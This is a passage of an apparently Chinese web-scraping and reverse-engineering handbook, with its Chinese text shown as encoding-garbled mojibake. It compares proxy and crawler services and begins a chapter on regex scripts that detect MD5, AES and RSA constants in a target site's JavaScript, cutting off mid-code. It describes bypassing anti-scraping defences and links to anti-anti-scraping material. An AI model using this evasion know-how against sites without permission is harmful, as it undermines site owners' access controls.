          </tr>
          <tr>
            <td>æœ€ä½æ¶ˆè´¹</td>
            <td>$500/æœˆ</td>
            <td>$75/æœˆ</td>
            <td>$300/æœˆ</td>
          </tr>
          <tr>
            <td>æˆåŠŸç‡</td>
            <td>99.5%</td>
            <td>99.3%</td>
            <td>99.6%</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h4 id="æ•°æ®ä¸­å¿ƒä»£ç†datacenter-proxy">æ•°æ®ä¸­å¿ƒä»£ç†ï¼ˆDatacenter Proxyï¼‰</h4>

      <p><strong>æˆæœ¬ä½ï¼Œé€‚åˆå¤§è§„æ¨¡çˆ¬å–</strong>:</p>

      <ul>
        <li>Webshare: $2.00/10ä¸ªä»£ç†/æœˆ</li>
        <li>Proxy-Seller: $1.20/IP/æœˆ</li>
        <li>ProxyRack: $65/5000 ç«¯å£/æœˆ</li>
      </ul>

      <p><strong>å±€é™</strong>: æ˜“è¢«è¯†åˆ«ä¸ºä»£ç†ï¼Œå°ç¦ç‡è¾ƒé«˜</p>

      <hr />

      <h3 id="4-åˆ†å¸ƒå¼çˆ¬è™«å¹³å°å¯¹æ¯”">4. åˆ†å¸ƒå¼çˆ¬è™«å¹³å°å¯¹æ¯”</h3>

      <h4 id="scrapy-cloudscrapinghub">Scrapy Cloudï¼ˆScrapinghubï¼‰</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>Scrapyé¡¹ç›®æ‰˜ç®¡</li>
        <li>è‡ªåŠ¨æ‰©å±•Crawler</li>
        <li>å†…ç½®ä»£ç†å’Œåæ£€æµ‹</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Free: 1ä¸ªçˆ¬è™«</li>
        <li>Professional: $9/æœˆ/çˆ¬è™«</li>
        <li>Enterprise: å®šåˆ¶åŒ–</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.zyte.com/scrapy-cloud/</p>

      <hr />

      <h4 id="crawleraæ™ºèƒ½ä»£ç†è·¯ç”±">Crawleraï¼ˆæ™ºèƒ½ä»£ç†è·¯ç”±ï¼‰</h4>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨åˆ‡æ¢ä»£ç†IP</li>
        <li>æ™ºèƒ½é‡è¯•æœºåˆ¶</li>
        <li>ç»•è¿‡åçˆ¬è™«</li>
      </ul>

      <p><strong>å®šä»·</strong>: $25/æœˆèµ·ï¼ˆ10,000æ¬¡è¯·æ±‚ï¼‰</p>

      <p><strong>Pythoné›†æˆ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>

<span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;http&#39;</span><span class="p">:</span> <span class="s1">&#39;http://YOUR_API_KEY:@proxy.crawlera.com:8011/&#39;</span>
<span class="p">}</span>

<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com&#39;</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h4 id="parsehubå¯è§†åŒ–çˆ¬è™«">ParseHubï¼ˆå¯è§†åŒ–çˆ¬è™«ï¼‰</h4>

      <p><strong>ç‰¹ç‚¹</strong>:</p>

      <ul>
        <li>æ— ä»£ç çˆ¬è™«æ„å»ºå™¨</li>
        <li>è‡ªåŠ¨å¤„ç†JavaScriptæ¸²æŸ“</li>
        <li>äº‘ç«¯è¿è¡Œ</li>
      </ul>

      <p><strong>å®šä»·</strong>:</p>

      <ul>
        <li>Free: 5ä¸ªé¡¹ç›®</li>
        <li>Standard: $189/æœˆï¼ˆ20ä¸ªé¡¹ç›®ï¼‰</li>
        <li>Professional: $599/æœˆï¼ˆæ— é™é¡¹ç›®ï¼‰</li>
      </ul>

      <p><strong>é€‚ç”¨</strong>: éæŠ€æœ¯äººå‘˜ã€å¿«é€ŸåŸå‹</p>

      <p><strong>å®˜ç½‘</strong>: https://www.parsehub.com/</p>

      <hr />

      <h3 id="5-æˆæœ¬æ•ˆç›Šåˆ†æ">5. æˆæœ¬æ•ˆç›Šåˆ†æ</h3>

      <h4 id="æ¡ˆä¾‹ç”µå•†ä»·æ ¼ç›‘æ§100000é¡µå¤©">æ¡ˆä¾‹ï¼šç”µå•†ä»·æ ¼ç›‘æ§ï¼ˆ100,000é¡µ/å¤©ï¼‰</h4>

      <p><strong>æ–¹æ¡ˆAï¼šè‡ªå»º</strong></p>

      <ul>
        <li>æˆæœ¬ï¼šæœåŠ¡å™¨ $100/æœˆ + ä»£ç† $200/æœˆ = <strong>$300/æœˆ</strong></li>
        <li>è¿ç»´ï¼šéœ€è¦DevOpså·¥ç¨‹å¸ˆ</li>
        <li>é£é™©ï¼šéœ€è¦æŒç»­ç»´æŠ¤åæ£€æµ‹</li>
      </ul>

      <p><strong>æ–¹æ¡ˆBï¼šApify</strong></p>

      <ul>
        <li>æˆæœ¬ï¼šTeamè®¡åˆ’ <strong>$499/æœˆ</strong></li>
        <li>è¿ç»´ï¼šé›¶è¿ç»´</li>
        <li>é£é™©ï¼šä½ï¼Œå¹³å°è´Ÿè´£åæ£€æµ‹</li>
      </ul>

      <p><strong>æ–¹æ¡ˆCï¼šBright Data + Browserless</strong></p>

      <ul>
        <li>æˆæœ¬ï¼šä»£ç† $500/æœˆ + æµè§ˆå™¨ $299/æœˆ = <strong>$799/æœˆ</strong></li>
        <li>è¿ç»´ï¼šæœ€å°åŒ–</li>
        <li>é£é™©ï¼šæœ€ä½ï¼Œä¼ä¸šçº§SLA</li>
      </ul>

      <p><strong>ç»“è®º</strong>:</p>

      <ul>
        <li>&lt; 1ä¸‡é¡µ/å¤©ï¼šè‡ªå»ºæœ€åˆ’ç®—</li>
        <li>1-10ä¸‡é¡µ/å¤©ï¼šApifyæ€§ä»·æ¯”é«˜</li>
        <li>&gt; 10ä¸‡é¡µ/å¤©ï¼šæ··åˆæ–¹æ¡ˆï¼ˆè‡ªå»º+å•†ä¸šä»£ç†ï¼‰</li>
      </ul>

      <hr />

      <h3 id="6-æŠ€æœ¯é€‰å‹å†³ç­–æ ‘">6. æŠ€æœ¯é€‰å‹å†³ç­–æ ‘</h3>

      <pre><code>éœ€è¦è·¨æµè§ˆå™¨æµ‹è¯•ï¼Ÿ
â”œâ”€ æ˜¯ â†’ BrowserStack/Sauce Labs
â””â”€ å¦ â†’ éœ€è¦å¤§è§„æ¨¡çˆ¬å–ï¼Ÿ
    â”œâ”€ æ˜¯ï¼ˆ&gt;10ä¸‡é¡µ/å¤©ï¼‰â†’ è‡ªå»º + Bright Dataä»£ç†
    â””â”€ å¦ â†’ å›¢é˜Ÿæœ‰DevOpsï¼Ÿ
        â”œâ”€ æ˜¯ â†’ è‡ªå»ºPuppeteer Cluster
        â””â”€ å¦ â†’ Apify/ParseHub
</code></pre>

      <hr />

      <h3 id="7-å¼€æº-vs-å•†ä¸šæ–¹æ¡ˆç»¼åˆå¯¹æ¯”">7. å¼€æº vs å•†ä¸šæ–¹æ¡ˆç»¼åˆå¯¹æ¯”</h3>

      <table>
        <thead>
          <tr>
            <th>ç»´åº¦</th>
            <th>è‡ªå»ºå¼€æº</th>
            <th>åŠæ‰˜ç®¡ï¼ˆApifyï¼‰</th>
            <th>å…¨æ‰˜ç®¡ï¼ˆBrowserStackï¼‰</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>åˆå§‹æˆæœ¬</strong></td>
            <td>ä½</td>
            <td>ä¸­</td>
            <td>ä½</td>
          </tr>
          <tr>
            <td><strong>è¿è¥æˆæœ¬</strong></td>
            <td>é«˜ï¼ˆäººåŠ›ï¼‰</td>
            <td>ä½</td>
            <td>é›¶</td>
          </tr>
          <tr>
            <td><strong>å¯æ‰©å±•æ€§</strong></td>
            <td>éœ€è‡ªè¡Œå®ç°</td>
            <td>è‡ªåŠ¨æ‰©å±•</td>
            <td>è‡ªåŠ¨æ‰©å±•</td>
          </tr>
          <tr>
            <td><strong>æŠ€æœ¯æ§åˆ¶</strong></td>
            <td>å®Œå…¨æ§åˆ¶</td>
            <td>éƒ¨åˆ†æ§åˆ¶</td>
            <td>æœ‰é™æ§åˆ¶</td>
          </tr>
          <tr>
            <td><strong>å­¦ä¹ æ›²çº¿</strong></td>
            <td>é™¡å³­</td>
            <td>ä¸­ç­‰</td>
            <td>å¹³ç¼“</td>
          </tr>
          <tr>
            <td><strong>åæ£€æµ‹èƒ½åŠ›</strong></td>
            <td>éœ€è‡ªå·±ç»´æŠ¤</td>
            <td>å¹³å°æä¾›</td>
            <td>å¹³å°æä¾›</td>
          </tr>
          <tr>
            <td><strong>åˆè§„æ€§</strong></td>
            <td>è‡ªè¡Œè´Ÿè´£</td>
            <td>å¹³å°ååŠ©</td>
            <td>å¹³å°è´Ÿè´£</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="8-2025å¹´æ–°è¶‹åŠ¿">8. 2025å¹´æ–°è¶‹åŠ¿</h3>

      <h4 id="aié©±åŠ¨çš„çˆ¬è™«">AIé©±åŠ¨çš„çˆ¬è™«</h4>

      <p><strong>Browse AI</strong></p>

      <ul>
        <li>æ— ä»£ç AIçˆ¬è™«è®­ç»ƒ</li>
        <li>è‡ªåŠ¨é€‚åº”ç½‘ç«™ç»“æ„å˜åŒ–</li>
        <li>ä»·æ ¼ï¼š$49/æœˆèµ·</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: https://www.browse.ai/</p>

      <hr />

      <h4 id="playwrightæ‰˜ç®¡æœåŠ¡">Playwrightæ‰˜ç®¡æœåŠ¡</h4>

      <p><strong>Microsoft Playwright Testing</strong>ï¼ˆé¢„è§ˆç‰ˆï¼‰</p>

      <ul>
        <li>Azureäº‘ç«¯Playwrightæ‰§è¡Œ</li>
        <li>ä¸GitHub Actionsé›†æˆ</li>
        <li>æŒ‰ä½¿ç”¨é‡è®¡è´¹</li>
      </ul>

      <p><strong>çŠ¶æ€</strong>: å…¬å¼€é¢„è§ˆ</p>

      <hr />

      <h3 id="9-é¿å‘æŒ‡å—">9. é¿å‘æŒ‡å—</h3>

      <p><strong>å¸¸è§é™·é˜±</strong>:</p>

      <ol>
        <li>âŒ è¿‡åº¦ä¾èµ–å…è´¹æœåŠ¡ï¼ˆç¨³å®šæ€§å·®ï¼‰</li>
        <li>âŒ å¿½è§†æ³•å¾‹åˆè§„ï¼ˆçˆ¬è™«åˆæ³•æ€§å®¡æŸ¥ï¼‰</li>
        <li>âŒ ä½ä¼°è¿ç»´æˆæœ¬ï¼ˆè‡ªå»ºéœ€è¦ä¸“äººç»´æŠ¤ï¼‰</li>
        <li>âŒ é€‰é”™ä»£ç†ç±»å‹ï¼ˆä½å®…vsæ•°æ®ä¸­å¿ƒï¼‰</li>
      </ol>

      <p><strong>æœ€ä½³å®è·µ</strong>:</p>

      <ol>
        <li>âœ… ä»å°è§„æ¨¡å¼€å§‹ï¼Œé€æ­¥æ‰©å±•</li>
        <li>âœ… æ··åˆä½¿ç”¨å¼€æºå’Œå•†ä¸šå·¥å…·</li>
        <li>âœ… è®¾ç½®åˆç†çš„rate limiting</li>
        <li>âœ… å®šæœŸè¯„ä¼°æˆæœ¬æ•ˆç›Š</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#02-Tooling-puppeteer-playwright">Puppeteer ä¸ Playwright</a></li>
        <li><a href="../02-Tooling/selenium_webdriver.md">Selenium WebDriver</a></li>
        <li><a href="#07-Scripts-javascript-hook-scripts">JavaScript Hook è„šæœ¬</a></li>
        <li><a href="../02-Techniques/anti_anti_scraping.md">åçˆ¬è™«å¯¹æŠ—æŠ€æœ¯</a></li>
      </ul>

    </div>

    <div class="section" id="07-Scripts-crypto-detection-scripts">
      <h2>61. Crypto Detection Scripts</h2>
      <h1 id="åŠ å¯†ç®—æ³•è¯†åˆ«ä¸æ£€æµ‹è„šæœ¬">åŠ å¯†ç®—æ³•è¯†åˆ«ä¸æ£€æµ‹è„šæœ¬</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>åœ¨ Web é€†å‘å·¥ç¨‹ä¸­ï¼Œè¯†åˆ«ç›®æ ‡ç½‘ç«™ä½¿ç”¨çš„åŠ å¯†ç®—æ³•æ˜¯åˆ†æçš„ç¬¬ä¸€æ­¥ã€‚é€šè¿‡è‡ªåŠ¨åŒ–æ£€æµ‹è„šæœ¬ï¼Œå¯ä»¥å¿«é€Ÿå®šä½åŠ å¯†å‡½æ•°è°ƒç”¨ç‚¹ã€è¯†åˆ«ç®—æ³•ç±»å‹ï¼Œå¹¶æå–å…³é”®å‚æ•°ã€‚æœ¬ç« ä»‹ç»åŠ å¯†ç®—æ³•çš„ç‰¹å¾è¯†åˆ«ã€è‡ªåŠ¨æ£€æµ‹æ–¹æ³•ä»¥åŠå®æˆ˜Hookè„šæœ¬ã€‚</p>

      <hr />

      <h2 id="åŠ å¯†ç®—æ³•åŸºç¡€çŸ¥è¯†">åŠ å¯†ç®—æ³•åŸºç¡€çŸ¥è¯†</h2>

      <h3 id="å¸¸è§åŠ å¯†ç®—æ³•åˆ†ç±»">å¸¸è§åŠ å¯†ç®—æ³•åˆ†ç±»</h3>

      <h4 id="1-æ•£åˆ—ç®—æ³•hash-functions">1. æ•£åˆ—ç®—æ³•ï¼ˆHash Functionsï¼‰</h4>

      <p><strong>ç‰¹ç‚¹</strong>: å•å‘ä¸å¯é€†ï¼Œå›ºå®šé•¿åº¦è¾“å‡º</p>

      <table>
        <thead>
          <tr>
            <th>ç®—æ³•</th>
            <th>è¾“å‡ºé•¿åº¦</th>
            <th>ç‰¹å¾æ¨¡å¼</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>MD5</strong></td>
            <td>128 bit (32 hex)</td>
            <td>åŒ…å« <code>0x67452301</code>, <code>0xEFCDAB89</code> ç­‰é­”æ•°</td>
          </tr>
          <tr>
            <td><strong>SHA-1</strong></td>
            <td>160 bit (40 hex)</td>
            <td>åŒ…å« <code>0x67452301</code>, <code>0xEFCDAB89</code> ç­‰åˆå§‹å€¼</td>
          </tr>
          <tr>
            <td><strong>SHA-256</strong></td>
            <td>256 bit (64 hex)</td>
            <td>åŒ…å« <code>0x6A09E667</code>, <code>0xBB67AE85</code> ç­‰å¸¸é‡</td>
          </tr>
          <tr>
            <td><strong>SHA-512</strong></td>
            <td>512 bit (128 hex)</td>
            <td>64è½®è¿ç®—ï¼Œç‰¹å¾å¸¸é‡æ•°ç»„</td>
          </tr>
          <tr>
            <td><strong>SM3</strong></td>
            <td>256 bit (64 hex)</td>
            <td>å›½å¯†ç®—æ³•ï¼Œåˆå§‹å€¼ <code>0x7380166F</code></td>
          </tr>
        </tbody>
      </table>

      <h4 id="2-å¯¹ç§°åŠ å¯†ç®—æ³•symmetric-encryption">2. å¯¹ç§°åŠ å¯†ç®—æ³•ï¼ˆSymmetric Encryptionï¼‰</h4>

      <p><strong>ç‰¹ç‚¹</strong>: åŠ å¯†å’Œè§£å¯†ä½¿ç”¨ç›¸åŒå¯†é’¥</p>

      <table>
        <thead>
          <tr>
            <th>ç®—æ³•</th>
            <th>å¯†é’¥é•¿åº¦</th>
            <th>å—å¤§å°</th>
            <th>ç‰¹å¾</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>AES</strong></td>
            <td>128/192/256 bit</td>
            <td>128 bit</td>
            <td>S-Box æ›¿æ¢è¡¨ï¼ŒMixColumns æ··æ·†</td>
          </tr>
          <tr>
            <td><strong>DES</strong></td>
            <td>56 bit</td>
            <td>64 bit</td>
            <td>16è½® Feistel ç»“æ„</td>
          </tr>
          <tr>
            <td><strong>3DES</strong></td>
            <td>168 bit</td>
            <td>64 bit</td>
            <td>DES ä¸‰æ¬¡è¿­ä»£</td>
          </tr>
          <tr>
            <td><strong>RC4</strong></td>
            <td>40-2048 bit</td>
            <td>æµåŠ å¯†</td>
            <td>KSA å’Œ PRGA ä¸¤é˜¶æ®µ</td>
          </tr>
          <tr>
            <td><strong>SM4</strong></td>
            <td>128 bit</td>
            <td>128 bit</td>
            <td>å›½å¯†ç®—æ³•ï¼Œ32è½®éçº¿æ€§è¿­ä»£</td>
          </tr>
        </tbody>
      </table>

      <h4 id="3-éå¯¹ç§°åŠ å¯†ç®—æ³•asymmetric-encryption">3. éå¯¹ç§°åŠ å¯†ç®—æ³•ï¼ˆAsymmetric Encryptionï¼‰</h4>

      <p><strong>ç‰¹ç‚¹</strong>: å…¬é’¥åŠ å¯†ï¼Œç§é’¥è§£å¯†</p>

      <table>
        <thead>
          <tr>
            <th>ç®—æ³•</th>
            <th>å¯†é’¥é•¿åº¦</th>
            <th>åº”ç”¨åœºæ™¯</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>RSA</strong></td>
            <td>1024/2048/4096 bit</td>
            <td>æ•°å­—ç­¾åã€å¯†é’¥äº¤æ¢</td>
          </tr>
          <tr>
            <td><strong>ECC</strong></td>
            <td>256/384/521 bit</td>
            <td>ç§»åŠ¨è®¾å¤‡ã€IoT</td>
          </tr>
          <tr>
            <td><strong>SM2</strong></td>
            <td>256 bit</td>
            <td>å›½å¯†éå¯¹ç§°ç®—æ³•</td>
          </tr>
        </tbody>
      </table>

      <h4 id="4-ç¼–ç ç®—æ³•encoding">4. ç¼–ç ç®—æ³•ï¼ˆEncodingï¼‰</h4>

      <p><strong>æ³¨æ„</strong>: ç¼–ç ä¸æ˜¯åŠ å¯†ï¼Œå¯é€†</p>

      <table>
        <thead>
          <tr>
            <th>ç®—æ³•</th>
            <th>ç‰¹å¾</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Base64</strong></td>
            <td>å­—ç¬¦é›† <code>A-Za-z0-9+/=</code>ï¼Œé•¿åº¦æ˜¯4çš„å€æ•°</td>
          </tr>
          <tr>
            <td><strong>Base32</strong></td>
            <td>å­—ç¬¦é›† <code>A-Z2-7=</code>ï¼Œé•¿åº¦æ˜¯8çš„å€æ•°</td>
          </tr>
          <tr>
            <td><strong>Hex</strong></td>
            <td>å­—ç¬¦é›† <code>0-9A-F</code>ï¼Œé•¿åº¦æ˜¯2çš„å€æ•°</td>
          </tr>
          <tr>
            <td><strong>URL Encode</strong></td>
            <td>åŒ…å« <code>%XX</code> æ ¼å¼</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="åŠ å¯†ç®—æ³•ç‰¹å¾è¯†åˆ«">åŠ å¯†ç®—æ³•ç‰¹å¾è¯†åˆ«</h2>

      <h3 id="1-é€šè¿‡ä»£ç ç‰¹å¾è¯†åˆ«">1. é€šè¿‡ä»£ç ç‰¹å¾è¯†åˆ«</h3>

      <h4 id="md5-ç‰¹å¾æ£€æµ‹">MD5 ç‰¹å¾æ£€æµ‹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ MD5 ç®—æ³•ç‰¹å¾</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">detectMD5</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">patterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="c1">// MD5 åˆå§‹åŒ–å‘é‡ï¼ˆé­”æ•°ï¼‰</span>
<span class="w">        </span><span class="sr">/0x67452301/i</span><span class="p">,</span>
<span class="w">        </span><span class="sr">/0xEFCDAB89/i</span><span class="p">,</span>
<span class="w">        </span><span class="sr">/0x98BADCFE/i</span><span class="p">,</span>
<span class="w">        </span><span class="sr">/0x10325476/i</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// MD5 å¾ªç¯ç§»ä½å¸¸é‡</span>
<span class="w">        </span><span class="sr">/0xD76AA478/i</span><span class="p">,</span>
<span class="w">        </span><span class="sr">/0xE8C7B756/i</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// å‡½æ•°åç‰¹å¾</span>
<span class="w">        </span><span class="sr">/md5|MD5/</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// å…¸å‹æ“ä½œï¼šF = (B &amp; C) | (~B &amp; D)</span>
<span class="w">        </span><span class="sr">/[&amp;|~]\s*[a-z0-9_]+\s*[&amp;|]\s*[a-z0-9_]+/</span>
<span class="w">    </span><span class="p">];</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">patterns</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">pattern</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">pattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="aes-ç‰¹å¾æ£€æµ‹">AES ç‰¹å¾æ£€æµ‹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ AES ç®—æ³•ç‰¹å¾</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">detectAES</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">patterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="c1">// S-Box æ›¿æ¢è¡¨ç‰¹å¾å€¼</span>
<span class="w">        </span><span class="sr">/0x63.*0x7C.*0x77.*0x7B/</span><span class="p">,</span><span class="w">  </span><span class="c1">// S-Box å‰å‡ ä¸ªå€¼</span>

<span class="w">        </span><span class="c1">// Rijndael S-Box</span>
<span class="w">        </span><span class="sr">/sbox|s_box|SubBytes/i</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// è½®å¸¸é‡ Rcon</span>
<span class="w">        </span><span class="sr">/rcon|round.*const/i</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// MixColumns å¤šé¡¹å¼</span>
<span class="w">        </span><span class="sr">/0x02.*0x03.*0x01.*0x01/</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// å‡½æ•°å</span>
<span class="w">        </span><span class="sr">/aes|AES|rijndael/i</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// CBCã€ECB ç­‰æ¨¡å¼</span>
<span class="w">        </span><span class="sr">/CBC|ECB|CTR|GCM|CFB/</span>
<span class="w">    </span><span class="p">];</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">patterns</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">pattern</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">pattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="rsa-ç‰¹å¾æ£€æµ‹">RSA ç‰¹å¾æ£€æµ‹</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹ RSA ç®—æ³•ç‰¹å¾</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">detectRSA</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">patterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="c1">// æ¨¡å¹‚è¿ç®—</span>
<span class="w">        </span><span class="sr">/mod.*exp|modular.*exponentiation/i</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// å¤§æ•°è¿ç®—åº“</span>
<span class="w">        </span><span class="sr">/bigint|big.*integer|jsbn/i</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// RSA å…³é”®å­—</span>
<span class="w">        </span><span class="sr">/rsa|RSA/</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// å…¬é’¥æŒ‡æ•° e (å¸¸è§å€¼ï¼š65537 = 0x10001)</span>
<span class="w">        </span><span class="sr">/0x10001|65537/</span><span class="p">,</span>

<span class="w">        </span><span class="c1">// PKCS å¡«å……</span>
<span class="w">        </span><span class="sr">/pkcs.*1|oaep|pss/i</span>
<span class="w">    </span><span class="p">];</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">patterns</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">pattern</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">pattern</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">));</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="2-é€šè¿‡å¸¸é‡ç‰¹å¾è¯†åˆ«">2. é€šè¿‡å¸¸é‡ç‰¹å¾è¯†åˆ«</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åŠ å¯†ç®—æ³•å¸¸é‡æ•°æ®åº“</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">CRYPTO_CONSTANTS</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">MD5</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="mh">0x67452301</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEFCDAB89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x98BADCFE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10325476</span><span class="p">,</span>
<span class="w">        </span><span class="mh">0xD76AA478</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE8C7B756</span><span class="p">,</span><span class="w"> </span><span class="mh">0x242070DB</span>
<span class="w">    </span><span class="p">],</span>

<span class="w">    </span><span class="nx">SHA1</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="mh">0x67452301</span><span class="p">,</span><span class="w"> </span><span class="mh">0xEFCDAB89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x98BADCFE</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10325476</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC3D2E1F0</span>
<span class="w">    </span><span class="p">],</span>

<span class="w">    </span><span class="nx">SHA256</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="mh">0x6A09E667</span><span class="p">,</span><span class="w"> </span><span class="mh">0xBB67AE85</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3C6EF372</span><span class="p">,</span><span class="w"> </span><span class="mh">0xA54FF53A</span><span class="p">,</span>
<span class="w">        </span><span class="mh">0x510E527F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9B05688C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1F83D9AB</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5BE0CD19</span>
<span class="w">    </span><span class="p">],</span>

<span class="w">    </span><span class="nx">AES_SBOX</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="mh">0x63</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7C</span><span class="p">,</span><span class="w"> </span><span class="mh">0x77</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7B</span><span class="p">,</span><span class="w"> </span><span class="mh">0xF2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6B</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6F</span><span class="p">,</span><span class="w"> </span><span class="mh">0xC5</span><span class="p">,</span>
<span class="w">        </span><span class="mh">0x30</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x67</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2B</span><span class="p">,</span><span class="w"> </span><span class="mh">0xFE</span><span class="p">,</span><span class="w"> </span><span class="mh">0xD7</span><span class="p">,</span><span class="w"> </span><span class="mh">0xAB</span><span class="p">,</span><span class="w"> </span><span class="mh">0x76</span>
<span class="w">    </span><span class="p">],</span>

<span class="w">    </span><span class="nx">SM3</span><span class="o">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">        </span><span class="mh">0x7380166F</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4914B2B9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x172442D7</span><span class="p">,</span><span class="w"> </span><span class="mh">0xDA8A0600</span><span class="p">,</span>
<span class="w">        </span><span class="mh">0xA96F30BC</span><span class="p">,</span><span class="w"> </span><span class="mh">0x163138AA</span><span class="p">,</span><span class="w"> </span><span class="mh">0xE38DEE4D</span><span class="p">,</span><span class="w"> </span><span class="mh">0xB0FB0E4E</span>
<span class="w">    </span><span class="p">]</span>
<span class="p">};</span>

<span class="c1">// åœ¨ä»£ç ä¸­æœç´¢è¿™äº›å¸¸é‡</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">findCryptoConstants</span><span class="p">(</span><span class="nx">code</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">found</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">const</span><span class="w"> </span><span class="p">[</span><span class="nx">algo</span><span class="p">,</span><span class="w"> </span><span class="nx">constants</span><span class="p">]</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">CRYPTO_CONSTANTS</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
